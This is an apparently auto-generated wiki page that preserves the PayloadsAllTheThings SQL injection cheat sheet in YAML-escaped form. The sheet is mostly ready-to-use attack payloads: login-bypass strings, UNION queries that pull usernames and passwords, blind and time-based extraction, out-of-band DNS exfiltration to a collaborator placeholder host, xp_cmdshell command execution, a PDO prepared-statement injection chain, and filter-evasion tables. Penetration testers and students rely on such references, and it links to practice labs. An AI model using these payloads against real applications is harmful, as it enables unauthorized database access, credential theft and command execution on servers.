---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# SQL Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-sql-injection-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/SQL Injection/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [SQL Injection](../../topics/sql-injection/sql-injection.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-sql-injection-readme |
| name | SQL Injection |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md |

## Preserved Source Material

````yaml
_body: "# SQL Injection\n\n> SQL Injection (SQLi)  is a type of security vulnerability that allows an attacker to interfere\
  \ with the queries that an application makes to its database. SQL Injection is one of the most common and severe types of\
  \ web application vulnerabilities, enabling attackers to execute arbitrary SQL code on the database. This can lead to unauthorized\
  \ data access, data manipulation, and, in some cases, full compromise of the database server.\n\n## Summary\n\n* [CheatSheets](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/)\n\
  \    * [MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)\n\
  \    * [MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)\n\
  \    * [OracleSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md)\n\
  \    * [PostgreSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)\n\
  \    * [SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)\n\
  \    * [Cassandra Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Cassandra%20Injection.md)\n\
  \    * [DB2 Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/DB2%20Injection.md)\n\
  \    * [SQLmap](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLmap.md)\n* [Tools](#tools)\n\
  * [Entry Point Detection](#entry-point-detection)\n* [DBMS Identification](#dbms-identification)\n* [Authentication Bypass](#authentication-bypass)\n\
  \    * [Raw MD5 and SHA1](#raw-md5-and-sha1)\n* [UNION Based Injection](#union-based-injection)\n* [Error Based Injection](#error-based-injection)\n\
  * [Blind Injection](#blind-injection)\n    * [Boolean Based Injection](#boolean-based-injection)\n    * [Blind Error Based\
  \ Injection](#blind-error-based-injection)\n    * [Time Based Injection](#time-based-injection)\n    * [Out of Band (OAST)](#out-of-band-oast)\n\
  * [Stacked Based Injection](#stacked-based-injection)\n* [Polyglot Injection](#polyglot-injection)\n* [Routed Injection](#routed-injection)\n\
  * [Second Order SQL Injection](#second-order-sql-injection)\n* [PDO Prepared Statements](#pdo-prepared-statements)\n* [Generic\
  \ WAF Bypass](#generic-waf-bypass)\n    * [No Space Allowed](#no-space-allowed)\n    * [No Comma Allowed](#no-comma-allowed)\n\
  \    * [No Equal Allowed](#no-equal-allowed)\n    * [Case Modification](#case-modification)\n* [Labs](#labs)\n* [References](#references)\n\
  \n## Tools\n\n* [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap) - Automatic SQL injection and database takeover\
  \ tool\n* [r0oth3x49/ghauri](https://github.com/r0oth3x49/ghauri) - An advanced cross-platform tool that automates the process\
  \ of detecting and exploiting SQL injection security flaws\n\n## Entry Point Detection\n\nDetecting the entry point in SQL\
  \ injection (SQLi) involves identifying locations in an application where user input is not properly sanitized before it\
  \ is included in SQL queries.\n\n* **Error Messages**: Inputting special characters (e.g., a single quote ') into input\
  \ fields might trigger SQL errors. If the application displays detailed error messages, it can indicate a potential SQL\
  \ injection point.\n    * Simple characters: `'`, `\"`, `;`, `)` and `*`\n    * Simple characters encoded: `%27`, `%22`,\
  \ `%23`, `%3B`, `%29` and `%2A`\n    * Multiple encoding: `%%2727`, `%25%27`\n    * Unicode characters: `U+02BA`, `U+02B9`\n\
  \        * MODIFIER LETTER DOUBLE PRIME (`U+02BA` encoded as `%CA%BA`) is transformed into `U+0022` QUOTATION MARK (`)\n\
  \        * MODIFIER LETTER PRIME (`U+02B9` encoded as `%CA%B9`) is transformed into `U+0027` APOSTROPHE (')\n\n* **Tautology-Based\
  \ SQL Injection**: By inputting tautological (always true) conditions, you can test for vulnerabilities. For instance, entering\
  \ `admin' OR '1'='1` in a username field might log you in as the admin if the system is vulnerable.\n    * Merging characters\n\
  \n      ```sql\n      `+HERP\n      '||'DERP\n      '+'herp\n      ' 'DERP\n      '%20'HERP\n      '%2B'HERP\n      ```\n\
  \n    * Logic Testing\n\n      ```sql\n      page.asp?id=1 or 1=1 -- true\n      page.asp?id=1' or 1=1 -- true\n      page.asp?id=1\"\
  \ or 1=1 -- true\n      page.asp?id=1 and 1=2 -- false\n      ```\n\n* **Timing Attacks**: Inputting SQL commands that cause\
  \ deliberate delays (e.g., using `SLEEP` or `BENCHMARK` functions in MySQL) can help identify potential injection points.\
  \ If the application takes an unusually long time to respond after such input, it might be vulnerable.\n\n## DBMS Identification\n\
  \n### DBMS Identification Keyword Based\n\nCertain SQL keywords are specific to particular database management systems (DBMS).\
  \ By using these keywords in SQL injection attempts and observing how the website responds, you can often determine the\
  \ type of DBMS in use.\n\n| DBMS                | SQL Payload                     |\n| ------------------- | -------------------------------\
  \ |\n| MySQL               | `conv('a',16,2)=conv('a',16,2)` |\n| MySQL               | `connection_id()=connection_id()`\
  \ |\n| MySQL               | `crc32('MySQL')=crc32('MySQL')` |\n| MSSQL               | `BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)`\
  \ |\n| MSSQL               | `@@CONNECTIONS>0` |\n| MSSQL               | `@@CONNECTIONS=@@CONNECTIONS` |\n| MSSQL     \
  \          | `@@CPU_BUSY=@@CPU_BUSY` |\n| MSSQL               | `USER_ID(1)=USER_ID(1)` |\n| ORACLE              | `ROWNUM=ROWNUM`\
  \ |\n| ORACLE              | `RAWTOHEX('AB')=RAWTOHEX('AB')` |\n| ORACLE              | `LNNVL(0=123)` |\n| POSTGRESQL \
  \         | `5::int=5` |\n| POSTGRESQL          | `5::integer=5` |\n| POSTGRESQL          | `pg_client_encoding()=pg_client_encoding()`\
  \ |\n| POSTGRESQL          | `get_current_ts_config()=get_current_ts_config()` |\n| POSTGRESQL          | `quote_literal(42.5)=quote_literal(42.5)`\
  \ |\n| POSTGRESQL          | `current_database()=current_database()` |\n| SQLITE              | `sqlite_version()=sqlite_version()`\
  \ |\n| SQLITE              | `last_insert_rowid()>1` |\n| SQLITE              | `last_insert_rowid()=last_insert_rowid()`\
  \ |\n| MSACCESS            | `val(cvar(1))=1` |\n| MSACCESS            | `IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0` |\n\n### DBMS\
  \ Identification Error Based\n\nDifferent DBMSs return distinct error messages when they encounter issues. By triggering\
  \ errors and examining the specific messages sent back by the database, you can often identify the type of DBMS the website\
  \ is using.\n\n| DBMS                | Example Error Message                                                           \
  \         | Example Payload |\n| ------------------- | -----------------------------------------------------------------------------------------|-----------------|\n\
  | MySQL               | `You have an error in your SQL syntax; ... near '' at line 1`                            | `'` \
  \            |\n| PostgreSQL          | `ERROR: unterminated quoted string at or near \"'\"`                           \
  \            | `'`             |\n| PostgreSQL          | `ERROR: syntax error at or near \"1\"`                       \
  \                              | `1'`            |\n| Microsoft SQL Server| `Unclosed quotation mark after the character\
  \ string ''.`                                 | `'`             |\n| Microsoft SQL Server| `Incorrect syntax near ''.` \
  \                                                             | `'`             |\n| Microsoft SQL Server| `The conversion\
  \ of the varchar value to data type int resulted in an out-of-range value.`| `1'`            |\n| Oracle              |\
  \ `ORA-00933: SQL command not properly ended`                                              | `'`             |\n| Oracle\
  \              | `ORA-01756: quoted string not properly terminated`                                       | `'`        \
  \     |\n| Oracle              | `ORA-00923: FROM keyword not found where expected`                                    \
  \   | `1'`            |\n\n## Authentication Bypass\n\nIn a standard authentication mechanism, users provide a username\
  \ and password. The application typically checks these credentials against a database. For example, a SQL query might look\
  \ something like this:\n\n```SQL\nSELECT * FROM users WHERE username = 'user' AND password = 'pass';\n```\n\nAn attacker\
  \ can attempt to inject malicious SQL code into the username or password fields. For instance, if the attacker types the\
  \ following in the username field:\n\n```sql\n' OR '1'='1'--\n```\n\nThis payload is injecting an always true statement\
  \ into the username field and comment the rest SQL query.\nThe attacker can write anything in the password field because\
  \ the resulting SQL query will not check it anymore.\n\n```SQL\nSELECT * FROM users WHERE username = '' OR '1'='1'--' AND\
  \ password = '';\n```\n\nHere, `'1'='1'` is always true, which means the query could return a valid user, effectively bypassing\
  \ the authentication check.\n\n:warning: In this case, the database will return an array of results because it will match\
  \ every users in the table. This will produce an error in the server side since it was expecting only one result. By adding\
  \ a `LIMIT` clause, you can restrict the number of rows returned by the query.\n\nBy submitting the following payload in\
  \ the username field, you will log in as the first user in the database. Additionally, you can inject a payload in the password\
  \ field while using the correct username to target a specific user.\n\n```sql\n' or 1=1 limit 1 --\n```\n\n:warning: Avoid\
  \ using this payload indiscriminately, as it always returns true. It could interact with endpoints that may inadvertently\
  \ delete sessions, files, configurations, or database data.\n\n* [PayloadsAllTheThings/SQL Injection/Intruder/Auth_Bypass.txt](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt)\n\
  \n### Raw MD5 and SHA1\n\nIn PHP, if the optional `binary` parameter is set to true, then the `md5` digest is instead returned\
  \ in raw binary format with a length of 16. Let's take this PHP code where the authentication is checking the MD5 hash of\
  \ the password submitted by the user.\n\n```php\nsql = \"SELECT * FROM admin WHERE pass = '\".md5($password,true).\"'\"\
  ;\n```\n\nAn attacker can craft a payload where the result of the `md5($password,true)` function will contain a quote and\
  \ escape the SQL context, for example with `' or 'SOMETHING`.\n\n| Hash | Input    | Output (Raw)            |  Payload\
  \  |\n| ---- | -------- | ----------------------- | --------- |\n| md5  | ffifdyop | `'or'6�]��!r,��b`       | `'or'`  \
  \  |\n| md5  | 129581926211651571912466741651878684928 | `ÚT0D\x9F\x8Fo#ßÁ'or'8` | `'or'` |\n| sha1 | 3fDf     | `Q�u'='�@�[�t�-\
  \ o��_-!` | `'='`     |\n| sha1 | 178374   | `\x99ÜÛ¾}_i\x99\x9Ba!8Wm'/*´Õ`      | `'/*`     |\n| sha1 | 17       | `Ùp2ûjww\x99\
  %6\\`            | `\\`       |\n\nThis behavior can be abused to bypass the authentication by escaping the context.\n\n\
  ```php\nsql1 = \"SELECT * FROM admin WHERE pass = '\".md5(\"ffifdyop\", true).\"'\";\nsql1 = \"SELECT * FROM admin WHERE\
  \ pass = ''or'6�]��!r,��b\x1C'\";\n```\n\n### Hashed Passwords\n\nBy 2025, applications almost never store plaintext passwords.\
  \ Authentication systems instead use a representation of the password (a hash derived by a key-derivation function, often\
  \ with a salt). That evolution changes the mechanics of some classic SQL injection (SQLi) bypasses: an attacker who injects\
  \ rows via `UNION` must now supply values that match the stored representation the application expects, not the user's raw\
  \ password.\n\nMany naïve authentication flows perform these high-level steps:\n\n* Query the database for the user record\
  \ (e.g., `SELECT username, password_hash FROM users WHERE username = ?`).\n* Receive the stored `password_hash` from the\
  \ DB.\n* Locally compute `hash(input_password)` using whatever algorithm is configured.\n* Compare `stored_password_hash\
  \ == hash(input_password)`.\n\nIf an attacker can inject an extra row into the result set (for example using `UNION`), they\
  \ can make the application receive an attacker-controlled stored_password_hash. If that injected hash equals `hash(attacker_supplied_password)`\
  \ as computed by the app, the comparison succeeds and the attacker is authenticated as the injected username.\n\n```sql\n\
  admin' AND 1=0 UNION ALL SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'--\n```\n\n* `AND 1=0`: to force the request\
  \ to be false.\n* `SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'`: select as many columns as necessary, here 161ebd7d45089b3446ee4e0d86dbcf92\
  \ corresponds to `MD5(\"P@ssw0rd\")`.\n\nIf the application computes `MD5(\"P@ssw0rd\")` and that equals `161ebd7d45089b3446ee4e0d86dbcf92`,\
  \ then supplying `\"P@ssw0rd\"` as the login password will pass the check.\n\nThis method fails if the app stores `salt`\
  \ and `KDF(salt, password)`. A single injected static hash cannot match a per-user salted result unless the attacker also\
  \ knows or controls the salt and KDF parameters.\n\n## UNION Based Injection\n\nIn a standard SQL query, data is retrieved\
  \ from one table. The `UNION` operator allows multiple `SELECT` statements to be combined. If an application is vulnerable\
  \ to SQL injection, an attacker can inject a crafted SQL query that appends a `UNION` statement to the original query.\n\
  \nLet's assume a vulnerable web application retrieves product details based on a product ID from a database:\n\n```sql\n\
  SELECT product_name, product_price FROM products WHERE product_id = 'input_id';\n```\n\nAn attacker could modify the `input_id`\
  \ to include the data from another table like `users`.\n\n```SQL\n1' UNION SELECT username, password FROM users --\n```\n\
  \nAfter submitting our payload, the query become the following SQL:\n\n```SQL\nSELECT product_name, product_price FROM products\
  \ WHERE product_id = '1' UNION SELECT username, password FROM users --';\n```\n\n:warning: The 2 SELECT clauses must have\
  \ the same number of columns.\n\n## Error Based Injection\n\nError-Based SQL Injection is a technique that relies on the\
  \ error messages returned from the database to gather information about the database structure. By manipulating the input\
  \ parameters of an SQL query, an attacker can make the database generate error messages. These errors can reveal critical\
  \ details about the database, such as table names, column names, and data types, which can be used to craft further attacks.\n\
  \nFor example, on a PostgreSQL, injecting this payload in a SQL query would result in an error since the LIMIT clause is\
  \ expecting a numeric value.\n\n```sql\nLIMIT CAST((SELECT version()) as numeric) \n```\n\nThe error will leak the output\
  \ of the `version()`.\n\n```ps1\nERROR: invalid input syntax for type numeric: \"PostgreSQL 9.5.25 on x86_64-pc-linux-gnu\"\
  \n```\n\n## Blind Injection\n\nBlind SQL Injection is a type of SQL Injection attack that asks the database true or false\
  \ questions and determines the answer based on the application's response.\n\n### Boolean Based Injection\n\nAttacks rely\
  \ on sending an SQL query to the database, making the application return a different result depending on whether the query\
  \ returns TRUE or FALSE. The attacker can infer information based on differences in the behavior of the application.\n\n\
  Size of the page, HTTP response code, or missing parts of the page are strong indicators to detect whether the Boolean-based\
  \ Blind SQL injection was successful.\n\nHere is a naive example to recover the content of the `@@hostname` variable.\n\n\
  **Identify Injection Point and Confirm Vulnerability** : Inject a payload that evaluates to true/false to confirm SQL injection\
  \ vulnerability. For example:\n\n```ps1\nhttp://example.com/item?id=1 AND 1=1 -- (Expected: Normal response)\nhttp://example.com/item?id=1\
  \ AND 1=2 -- (Expected: Different response or error)\n```\n\n**Extract Hostname Length**: Guess the length of the hostname\
  \ by incrementing until the response indicates a match. For example:\n\n```ps1\nhttp://example.com/item?id=1 AND LENGTH(@@hostname)=1\
  \ -- (Expected: No change)\nhttp://example.com/item?id=1 AND LENGTH(@@hostname)=2 -- (Expected: No change)\nhttp://example.com/item?id=1\
  \ AND LENGTH(@@hostname)=N -- (Expected: Change in response)\n```\n\n**Extract Hostname Characters** : Extract each character\
  \ of the hostname using substring and ASCII comparison:\n\n```ps1\nhttp://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname,\
  \ 1, 1)) > 64 -- \nhttp://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) = 104 -- \n```\n\nThen repeat the\
  \ method to discover every characters of the `@@hostname`. Obviously this example is not the fastest way to obtain them.\
  \ Here are a few pointers to speed it up:\n\n* Extract characters using dichotomy: it reduces the number of requests from\
  \ linear to logarithmic time, making data extraction much more efficient.\n\n### Blind Error Based Injection\n\nAttacks\
  \ rely on sending an SQL query to the database, making the application return a different result depending on whether the\
  \ query returned successfully or triggered an error. In this case, we only infer the success from the server's answer, but\
  \ the data is not extracted from output of the error.\n\n**Example**: Using `json()` function in SQLite to trigger an error\
  \ as an oracle to know when the injection is true or false.\n\n```sql\n' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND\
  \ 'A'='A -- OK\n' AND CASE WHEN 1=2 THEN 1 ELSE json('') END AND 'A'='A -- malformed JSON\n```\n\n### Time Based Injection\n\
  \nTime-based SQL Injection is a type of blind SQL Injection attack that relies on database delays to infer whether certain\
  \ queries return true or false. It is used when an application does not display any direct feedback from the database queries\
  \ but allows execution of time-delayed SQL commands. The attacker can analyze the time it takes for the database to respond\
  \ to indirectly gather information from the database.\n\n* Default `SLEEP` function for the database\n\n```sql\n' AND SLEEP(5)/*\n\
  ' AND '1'='1' AND SLEEP(5)\n' ; WAITFOR DELAY '00:00:05' --\n```\n\n* Heavy queries that take a lot of time to complete,\
  \ usually crypto functions.\n\n```sql\nBENCHMARK(2000000,MD5(NOW()))\n```\n\nLet's see a basic example to recover the version\
  \ of the database using a time based sql injection.\n\n```sql\nhttp://example.com/item?id=1 AND IF(SUBSTRING(VERSION(),\
  \ 1, 1) = '5', BENCHMARK(1000000, MD5(1)), 0) --\n```\n\nIf the server's response is taking a few seconds before getting\
  \ received, then the version is starting is by '5'.\n\n### Out of Band (OAST)\n\nOut-of-Band SQL Injection (OOB SQLi) occurs\
  \ when an attacker uses alternative communication channels to exfiltrate data from a database. Unlike traditional SQL injection\
  \ techniques that rely on immediate responses within the HTTP response, OOB SQL injection depends on the database server's\
  \ ability to make network connections to an attacker-controlled server. This method is particularly useful when the injected\
  \ SQL command's results cannot be seen directly or the server's responses are not stable or reliable.\n\nDifferent databases\
  \ offer various methods for creating out-of-band connections, the most common technique is the DNS exfiltration:\n\n* MySQL\n\
  \n  ```sql\n  LOAD_FILE('\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\a')\n  SELECT ... INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\
  a'\n  ```\n\n* MSSQL\n\n  ```sql\n  SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')\n  exec master..xp_dirtree\
  \ '//BURP-COLLABORATOR-SUBDOMAIN/a'\n  ```\n\n## Stacked Based Injection\n\nStacked Queries SQL Injection is a technique\
  \ where multiple SQL statements are executed in a single query, separated by a delimiter such as a semicolon (`;`). This\
  \ allows an attacker to execute additional malicious SQL commands following a legitimate query. Not all databases or application\
  \ configurations support stacked queries.\n\n```sql\n1; EXEC xp_cmdshell('whoami') --\n```\n\n## Polyglot Injection\n\n\
  A polygot SQL injection payload is a specially crafted SQL injection attack string that can successfully execute in multiple\
  \ contexts or environments without modification. This means that the payload can bypass different types of validation, parsing,\
  \ or execution logic in a web application or database by being valid SQL in various scenarios.\n\n```sql\nSLEEP(1) /*' or\
  \ SLEEP(1) or '\" or SLEEP(1) or \"*/\n```\n\n## Routed Injection\n\n> Routed SQL injection is a situation where the injectable\
  \ query is not the one which gives output but the output of injectable query goes to the query which gives output. - Zenodermus\
  \ Javanicus\n\nIn short, the result of the first SQL query is used to build the second SQL query. The usual format is `'\
  \ union select 0xHEXVALUE --` where the HEX is the SQL injection for the second query.\n\n**Example 1**:\n\n`0x2720756e696f6e2073656c65637420312c3223`\
  \ is the hex encoded of `' union select 1,2#`\n\n```sql\n' union select 0x2720756e696f6e2073656c65637420312c3223#\n```\n\
  \n**Example 2**:\n\n`0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061` is\
  \ the hex encoded of `-1' union select login,password from users-- a`.\n\n```sql\n-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061\
  \ -- a\n```\n\n## Second Order SQL Injection\n\nSecond Order SQL Injection is a subtype of SQL injection where the malicious\
  \ SQL payload is primarily stored in the application's database and later executed by a different functionality of the same\
  \ application.\nUnlike first-order SQLi, the injection doesn't happen right away. It is **triggered in a separate step**,\
  \ often in a different part of the application.\n\n1. User submits input that is stored (e.g., during registration or profile\
  \ update).\n\n   ```text\n   Username: attacker'--\n   Email: attacker@example.com\n   ```\n\n2. That input is saved **without\
  \ validation** but doesn't trigger a SQL injection.\n\n   ```sql\n   INSERT INTO users (username, email) VALUES ('attacker\\\
  '--', 'attacker@example.com');\n   ```\n\n3. Later, the application retrieves and uses the stored data in a SQL query.\n\
  \n   ```python\n   query = \"SELECT * FROM logs WHERE username = '\" + user_from_db + \"'\"\n   ```\n\n4. If this query\
  \ is built unsafely, the injection is triggered.\n\n## PDO Prepared Statements\n\nPDO, or PHP Data Objects, is an extension\
  \ for PHP that provides a consistent and secure way to access and interact with databases. It is designed to offer a standardized\
  \ approach to database interaction, allowing developers to use a consistent API across multiple types of databases like\
  \ MySQL, PostgreSQL, SQLite, and more.\n\nPDO allows for binding of input parameters, which ensures that user data is properly\
  \ sanitized before being executed as part of a SQL query. However it might still be vulnerable to SQL injections if the\
  \ developers allowed user input inside the SQL query.\n\n**Requirements**:\n\n* DMBS\n    * **MySQL** is vulnerable by default.\n\
  \    * **Postgres** is not vulnerable by default, unless the emulation is turned on with `PDO::ATTR_EMULATE_PREPARES =>\
  \ true`.\n    * **SQLite** is not vulnerable to this attack.\n\n* SQL injection anywhere inside a PDO statement: `$pdo->prepare(\"\
  SELECT $INJECT_SQL_HERE...\")`.\n* PDO used for another SQL parameter, either with `?` or `:parameter`.\n\n    ```php\n\
  \    $pdo = new PDO(APP_DB_HOST, APP_DB_USER, APP_DB_PASS);\n    $col = '`' . str_replace('`', '``', $_GET['col']) . '`';\n\
  \n    $stmt = $pdo->prepare(\"SELECT $col FROM animals WHERE name = ?\");\n    $stmt->execute([$_GET['name']]);\n    //\
  \ or\n    $stmt = $pdo->prepare(\"SELECT $col FROM animals WHERE name = :name\");\n    $stmt->execute(['name' => $_GET['name']]);\n\
  \    ```\n\n**Methodology**:\n\n**NOTE**: In PHP 8.3 and lower, the injection happens even without a null byte (`\\0`).\
  \ The attacker only needs to smuggle a \"`:`\" or a \"`?`\".\n\n* Detect the SQLi using `?#\\0`: `GET /index.php?col=%3f%23%00&name=anything`\n\
  \n    ```ps1\n    # 1st Payload: ?#\\0\n    # 2nd Payload: anything\n    You have an error in your SQL syntax; check the\
  \ manual that corresponds to your MariaDB server version for the right syntax to use near '`'anything'#' at line 1\n   \
  \ ```\n\n* Force a select \\`'x\\` instead of a column name and create a comment. Inject a backtick to fix the column and\
  \ terminate the SQL query with `;#`: `GET /index.php?col=%3f%23%00&name=x%60;%23`\n\n    ```ps1\n    # 1st Payload: ?#\\\
  0\n    # 2nd Payload: x`;#\n    Column not found: 1054 Unknown column ''x' in 'SELECT'\n    ```\n\n* Inject in second parameter\
  \ the payload. `GET /index2.php?col=\\%3f%23%00&name=x%60+FROM+(SELECT+table_name+AS+`'x`+from+information_schema.tables)y%3b%2523`\n\
  \n    ```ps1\n    # 1st Payload: \\?#\\0\n    # 2nd Payload: x` FROM (SELECT table_name AS `'x` from information_schema.tables)y;%23\n\
  \    ALL_PLUGINS\n    APPLICABLE_ROLES\n    CHARACTER_SETS\n    CHECK_CONSTRAINTS\n    COLLATIONS\n    COLLATION_CHARACTER_SET_APPLICABILITY\n\
  \    COLUMNS\n    ```\n\n* Final SQL queries\n\n    ```SQL\n    -- Before $pdo->prepare\n    SELECT `\\?#\\0` FROM animals\
  \ WHERE name = ?\n\n    -- After $pdo->prepare\n    SELECT `\\'x` FROM (SELECT table_name AS `\\'x` from information_schema.tables)y;#'#\\\
  0` FROM animals WHERE name = ?\n    ```\n\n## Generic WAF Bypass\n\n---\n\n### No Space Allowed\n\nSome web applications\
  \ attempt to secure their SQL queries by blocking or stripping space characters to prevent simple SQL injection attacks.\
  \ However, attackers can bypass these filters by using alternative whitespace characters, comments, or creative use of parentheses.\n\
  \n#### Alternative Whitespace Characters\n\nMost databases interpret certain ASCII control characters and encoded spaces\
  \ (such as tabs, newlines, etc.) as whitespace in SQL statements. By encoding these characters, attackers can often evade\
  \ space-based filters.\n\n| Example Payload               | Description                      |\n|-------------------------------|----------------------------------|\n\
  | `?id=1%09and%091=1%09--`      | `%09` is tab (`\\t`)              |\n| `?id=1%0Aand%0A1=1%0A--`      | `%0A` is line feed\
  \ (`\\n`)        |\n| `?id=1%0Band%0B1=1%0B--`      | `%0B` is vertical tab            |\n| `?id=1%0Cand%0C1=1%0C--`   \
  \   | `%0C` is form feed               |\n| `?id=1%0Dand%0D1=1%0D--`      | `%0D` is carriage return (`\\r`)  |\n| `?id=1%A0and%A01=1%A0--`\
  \      | `%A0` is non-breaking space      |\n\n**ASCII Whitespace Support by Database**:\n\n| DBMS         | Supported Whitespace\
  \ Characters (Hex)            |\n|--------------|--------------------------------------------------|\n| SQLite3      | 0A,\
  \ 0D, 0C, 09, 20                               |\n| MySQL 5      | 09, 0A, 0B, 0C, 0D, A0, 20                       |\n\
  | MySQL 3      | 01–1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0|\n| PostgreSQL   | 0A, 0D, 0C, 09, 20               \
  \                |\n| Oracle 11g   | 00, 0A, 0D, 0C, 09, 20                           |\n| MSSQL        | 01–1F, 20    \
  \                                    |\n\n#### Bypassing with Comments and Parentheses\n\nSQL allows comments and grouping,\
  \ which can break up keywords and queries, thus defeating space filters:\n\n| Bypass                                   \
  \ | Technique            |\n| ----------------------------------------- | -------------------- |\n| `?id=1/*comment*/AND/**/1=1/**/--`\
  \        | Comment              |\n| `?id=1/*!12345UNION*//*!12345SELECT*/1--` | Conditional comment  |\n| `?id=(1)and(1)=(1)--`\
  \                     | Parenthesis          |\n\n### No Comma Allowed\n\nBypass using `OFFSET`, `FROM` and `JOIN`.\n\n\
  | Forbidden           | Bypass |\n| ------------------- | ------ |\n| `LIMIT 0,1`         | `LIMIT 1 OFFSET 0` |\n| `SUBSTR('SQL',1,1)`\
  \ | `SUBSTR('SQL' FROM 1 FOR 1)` |\n| `SELECT 1,2,3,4`    | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT\
  \ 3)c JOIN (SELECT 4)d` |\n\n### No Equal Allowed\n\nBypass using LIKE/NOT IN/IN/BETWEEN\n\n| Bypass    | SQL Example |\n\
  | --------- | ------------------------------------------ |\n| `LIKE`    | `SUBSTRING(VERSION(),1,1)LIKE(5)`          |\n\
  | `NOT IN`  | `SUBSTRING(VERSION(),1,1)NOT IN(4,3)`      |\n| `IN`      | `SUBSTRING(VERSION(),1,1)IN(4,3)`          |\n\
  | `BETWEEN` | `SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 4` |\n\n### Case Modification\n\nBypass using uppercase/lowercase.\n\
  \n| Bypass    | Technique  |\n| --------- | ---------- |\n| `AND`     | Uppercase  |\n| `and`     | Lowercase  |\n| `aNd`\
  \     | Mixed case |\n\nBypass using keywords case insensitive or an equivalent operator.\n\n| Forbidden | Bypass      \
  \                |\n| --------- | --------------------------- |\n| `AND`     | `&&`                        |\n| `OR`   \
  \   | `\\|\\|`                      |\n| `=`       | `LIKE`, `REGEXP`, `BETWEEN` |\n| `>`       | `NOT BETWEEN 0 AND X`\
  \       |\n| `WHERE`   | `HAVING`                    |\n\n## Labs\n\n* [PortSwigger - SQL injection vulnerability in WHERE\
  \ clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)\n\
  * [PortSwigger - SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)\n\
  * [PortSwigger - SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)\n\
  * [PortSwigger - SQL Labs](https://portswigger.net/web-security/all-labs#sql-injection)\n* [Root Me - SQL injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-authentication)\n\
  * [Root Me - SQL injection - Authentication - GBK](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-authentication-GBK)\n\
  * [Root Me - SQL injection - String](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-String)\n* [Root Me\
  \ - SQL injection - Numeric](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Numeric)\n* [Root Me - SQL injection\
  \ - Routed](https://www.root-me.org/en/Challenges/Web-Server/SQL-Injection-Routed)\n* [Root Me - SQL injection - Error](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Error)\n\
  * [Root Me - SQL injection - Insert](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Insert)\n* [Root Me\
  \ - SQL injection - File reading](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-File-reading)\n* [Root\
  \ Me - SQL injection - Time based](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Time-based)\n* [Root Me\
  \ - SQL injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Blind)\n* [Root Me - SQL injection\
  \ - Second Order](https://www.root-me.org/en/Challenges/Web-Server/SQL-Injection-Second-Order)\n* [Root Me - SQL injection\
  \ - Filter bypass](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Filter-bypass)\n* [Root Me - SQL Truncation](https://www.root-me.org/en/Challenges/Web-Server/SQL-Truncation)\n\
  \n## References\n\n* [A Novel Technique for SQL Injection in PDO's Prepared Statements - Adam Kues - July 21, 2025](https://web.archive.org/web/20251017002820/https://slcyber.io/assetnote-security-research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/)\n\
  * [Analyzing CVE-2018-6376 – Joomla!, Second Order SQL Injection - Not So Secure - February 9, 2018](https://web.archive.org/web/20180209143119/https://www.notsosecure.com/analyzing-cve-2018-6376/)\n\
